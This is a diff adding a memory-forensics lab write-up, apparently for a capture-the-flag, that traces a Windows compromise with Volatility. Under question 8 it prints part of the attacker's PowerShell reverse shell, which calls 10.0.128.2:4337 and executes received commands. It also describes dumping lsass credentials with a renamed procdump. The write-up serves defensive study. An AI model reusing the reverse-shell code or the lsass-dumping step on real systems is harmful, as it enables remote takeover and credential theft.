@@ -1,1 +1,48 @@
-test
+Q1 and Q2 can be answered by kdbgscan plugin.
+
+3. Understanding the hierarchical relations between processes helps determine the source of the malicious process and the initial attack vector. Provide the PID of the origin malicious process.
+- Use pstree and notice that one process spawns powershell. That process should not be spawning powershell.
+
+4. The start time of processes can help establish a timeline of events and determine if a process was running before or after a specific event, such as a data breach or malware infection. When did the compromise occur?
+- Get the time of the process from Q3.
+
+5. The attacker ran a Sysinternals tool and renamed it to a well-known process to evade detection. What is the PID of the Sysinternals tool process?
+- In psxview there are 2 lsass process running. There should not be 2 LSASS. One of it does not have a parent process. That is the rouge process.
+
+6. What is the process command line of the Sysinternals tool? Provide the entire command with arguments.
+- Using strings on the dump file can will see C:\Windows\lsass.exe\procdump64.exe show up. Something is wrong with the lsass location. Search the memory dump using strings.exe -f memory.dmp | select-string "C:\Windows\lsass.exe".
+- From the arguments, most likely attacker is trying to dump lsass using procdump.
+
+7. Trace back the source of the Sysinternals tool process. What is the PID of the process that spawned the Sysinternal tool process?
+- Guess that it was the powershell malicious process from earlier.
+
+8. Most attackers utilize the Windows registry to create files and perform other malicious tasks. However, registry changes are not reflected instantly (remember dirty hives?). In similar situations, determining created files can help you understand what happened even if you do not have visibility over registry changes.
+The attacker created the following file 'C:\Windows\System32\svchost.bat'. What are the IP and port used for communications?
+- Use either strings or filescan + dumpfile for this.
+0x00009c055c566aa0     16      0 -W-r-- \Device\HarddiskVolume4\Windows\System32\svchost.bat
+System.Net.Sockets.TCPClient('10.0.128.2',4337);`$stream =
+`$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i =
+`$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object
+-TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0,
+`$i);`$sendback = (iex `". { `$data } 2>&1`" | Out-String ); " |
+
+
+9. Examine the dump network connections and provide the source port of the malicious session.
+x9c055c2e1010     TCPv4    10.0.128.0:63944               10.0.128.2:4337      ESTABLISHED      -1 
+
+10. Some attack artifacts (files) may be on the computer disk or memory. Analyze the svchost.bat file in memory and provide its creation time.
+MFT entry found at offset 0x8247a1e8
+Attribute: In Use & File
+Record Number: 1127
+Link count: 1
+
+
+$STANDARD_INFORMATION
+Creation                       Modified                       MFT Altered                    Access Date                    Type
+------------------------------ ------------------------------ ------------------------------ ------------------------------ ----
+2023-02-03 13:25:04 UTC+0000 2023-02-03 13:25:04 UTC+0000   2023-02-03 13:25:04 UTC+0000   2023-02-03 13:25:04 UTC+0000   Archive
+
+$FILE_NAME
+Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
+------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
+2023-02-03 13:25:04 UTC+0000 2023-02-03 13:25:04 UTC+0000   2023-02-03 13:25:04 UTC+0000   2023-02-03 13:25:04 UTC+0000   Windows\System32\svchost.bat
